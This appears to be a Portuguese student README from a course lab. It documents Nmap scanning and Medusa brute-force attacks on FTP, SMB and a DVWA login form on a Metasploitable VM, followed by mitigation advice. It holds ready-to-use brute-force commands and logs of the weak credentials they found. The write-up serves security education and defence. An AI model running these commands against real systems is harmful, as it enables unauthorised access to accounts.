# Projeto de Pentest: Análise de Força Bruta em Múltiplos Serviços

![Banner do Projeto](images/desola-lanre-ologun-vII7qKAk-9A-unsplash.jpg)
## 🚩 Sumário

* [Descrição do Projeto](#-descrição-do-projeto)
* [Objetivos](#-objetivos)
* [Ambiente Controlado](#-ambiente-controlado)
* [Ferramentas Utilizadas](#-ferramentas-utilizadas)
* [Fases da Execução](#-fases-da-execução)
  * [Fase 1: Reconhecimento (Scanning)](#fase-1-reconhecimento-scanning)
  * [Fase 2: Ataque de Força Bruta (FTP)](#fase-2-ataque-de-força-bruta-ftp)
  * [Fase 3: Ataque de Força Bruta (SMB)](#fase-3-ataque-de-força-bruta-smb)
  * [Fase 4: Ataque de Força Bruta (Web)](#fase-4-ataque-de-força-bruta-web)
* [Resultados e Evidências](#-resultados-e-evidências)
* [Mitigação e Recomendações](#-mitigação-e-recomendações)
* [Desafios e Aprendizados](#-desafios-e-aprendizados)
* [Autor](#-autor)

---

## 📖 Descrição do Projeto

Este projeto documenta a execução de um teste de invasão (pentest) focado em ataques de força bruta contra múltiplos serviços (FTP, SMB e Web). O objetivo foi auditar a segurança de senhas em um ambiente de laboratório controlado, utilizando a máquina vulnerável **Metasploitable** e a ferramenta **Medusa**.

Este exercício prático faz parte do [Santander - Cibersegurança 2025] e demonstra a aplicação de técnicas de auditoria de segurança ofensiva com fins estritamente educacionais e éticos.

## 🎯 Objetivos

Os principais objetivos deste desafio foram:
* Compreender na prática como funcionam os ataques de força bruta.
* Utilizar o Kali Linux e o Medusa para realizar a auditoria de serviços.
* Identificar credenciais fracas ou padrão em serviços expostos.
* Documentar o processo técnico de forma clara e estruturada.
* Propor medidas de mitigação para as vulnerabilidades encontradas.

## 🔬 Ambiente Controlado

* **Máquina Atacante:** Kali Linux (IP: `192.168.0.15`)
* **Máquina Alvo:** Metasploitable (IP: `192.168.0.10`)
* **Software de Virtualização:** Oracle VirtualBox
* **Configuração de Rede:** Host-Only

**Nota:** Todo o tráfego e atividade foram isolados neste ambiente de laboratório, sem qualquer impacto em sistemas de produção ou redes externas.

## 🛠️ Ferramentas Utilizadas

* **[Medusa](https://github.com/jmk-foofus/medusa):** A principal ferramenta para o ataque de força bruta paralelo e modular.
* **[Nmap](https://nmap.org/):** Utilizado na fase de reconhecimento para descobrir serviços e portas abertas no alvo.
* **Wordlists:**
    * `user.txt` (Arquivo com lista de usuários)
    * `password.txt` (Arquivo com lista de senhas)

---

## ⚡ Fases da Execução

Aqui será detalhado o passo a passo técnico de cada ataque.

---

### ⚡Fase 1: Reconhecimento (Scanning)

O primeiro passo foi identificar os serviços ativos na máquina alvo. Utilizei o Nmap para realizar uma varredura de portas.

**Comando Executado:**
```bash
nmap -sV -p 21,139,445,80 192.168.0.10

```
Resultados do Nmap:A varredura confirmou que todos os serviços alvo estavam ativos:PlaintextStarting Nmap 7.91 ( [https://nmap.org](https://nmap.org) )
```
Nmap scan report for 192.168.0.10
Host is up (0.0012s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: metasploitable; OS: Unix

Nmap done: 1 IP address (1 host up) scanned in 11.87 seconds
```
### ⚡Fase 2: Ataque de Força Bruta (FTP)
Com a porta 21 (FTP) confirmada como aberta, o próximo passo foi usar o Medusa para realizar um ataque de força bruta.

Comando Executado:
```bash
medusa -h 192.168.0.10 -U ./user.txt -P ./password.txt -M ftp
```
Resultado (Evidência): O Medusa teve sucesso em encontrar uma credencial válida, como mostrado no log abaixo:
```
2025-11-04 22:05:54 ACCOUNT FOUND: [ftp] Host: 192.168.0.10 User: msfadmin Password: msfadmin
```
### ⚡Fase 3: Ataque de Força Bruta (SMB)
Seguindo a mesma lógica do FTP, o próximo alvo foi o serviço SMB, confirmado nas portas 139 e 445 pelo Nmap.

Comando Executado:
```bash
medusa -h 192.168.0.10 -U ./user.txt -P ./password.txt -M smbnt
```
Resultado (Evidência): O Medusa novamente obteve sucesso, confirmando que a mesma credencial padrão estava sendo reutilizada:
```
ACCOUNT FOUND: [smbnt] Host: 192.168.0.10 User: msfadmin Password: msfadmin
```
### ⚡Fase 4: Ataque de Força Bruta (Web - DVWA)
A última fase foi direcionada a um formulário de login web na aplicação DVWA, rodando na porta 80.

Comando Executado:
```bash
medusa -h 192.168.0.10 -U ./user.txt -P ./password.txt -M http -m FORM:"/dvwa/login.php" -m PARAMS:"username=^USER^&password=^PASS^&Login=Login"
```
Resultado (Evidência): O ataque foi bem-sucedido e encontrou múltiplas credenciais válidas, todas usando senhas fracas:
```
2025-11-07 21:25:40 ACCOUNT FOUND: [http] Host: 192.168.0.10 User: root Password: root [SUCCESS]
2025-11-07 21:25:40 ACCOUNT FOUND: [http] Host: 192.168.0.10 User: admin Password: root [SUCCESS]
2025-11-07 21:25:40 ACCOUNT FOUND: [http] Host: 192.168.0.10 User: msfadmin Password: root [SUCCESS]
2025-11-07 21:25:40 ACCOUNT FOUND: [http] Host: 192.168.0.10 User: user Password: root [SUCCESS]
```
### 📈 Resultados e Evidências
A auditoria de força bruta foi bem-sucedida em todos os três serviços testados. Os resultados estão consolidados na tabela abaixo, demonstrando um alto risco de reutilização de senhas e uso de credenciais padrão.
```bash
Serviço,Porta,Usuário(s) Encontrado(s),Senha(s) Encontrada(s)
FTP,21,msfadmin,msfadmin
SMB,445,msfadmin,msfadmin
HTTP (DVWA),80,"root, admin, msfadmin, user",root (para todos)
```
### 🛡️ Mitigação e Recomendações
Com base nas vulnerabilidades críticas encontradas, as seguintes medidas de segurança são recomendadas para corrigir as falhas e prevenir futuros ataques:

Política de Senhas Fortes: Implementar uma política de senhas obrigatória que exija complexidade (maiúsculas, minúsculas, números e símbolos) e um comprimento mínimo de 12 a 16 caracteres.

Remoção de Credenciais Padrão: A causa raiz de todos os acessos foi o uso de senhas padrão (msfadmin, root). A primeira ação após a instalação de qualquer sistema deve ser a troca imediata de todas as credenciais de fábrica.

Implementação de Account Lockout: Configurar um bloqueio temporário de conta (ex: 15 minutos) após um número baixo de tentativas de login falhas (ex: 5 tentativas). Isso neutraliza a eficácia de ataques de força bruta.

Autenticação Multifator (MFA): Para todos os serviços críticos, especialmente acessos web, implementar o MFA (Autenticação de Múltiplos Fatores) como uma camada de defesa adicional.

Firewall e Segmentação de Rede: Serviços como FTP e SMB não deveriam, em circunstância alguma, estar expostos à internet pública. Eles devem ser protegidos por um firewall e acessíveis apenas por redes internas confiáveis ou via VPN.

### 💡 Desafios e Aprendizados
Durante este desafio, aprendi na prática o fluxo de trabalho de um pentest, desde o reconhecimento passivo com Nmap até a exploração ativa com o Medusa. O maior desafio foi entender a sintaxe correta para cada módulo, especialmente o módulo HTTP, que exigia parâmetros específicos. Este projeto reforçou a importância de não apenas encontrar uma falha, mas de saber documentá-la de forma clara e estruturada, como neste README.

### 👤 Autor
Pedro Henrique Ferrante

GitHub: github.com/FerranteAbc

LinkedIn: www.linkedin.com/in/pedro-henrique-ferrante-prado-128123230
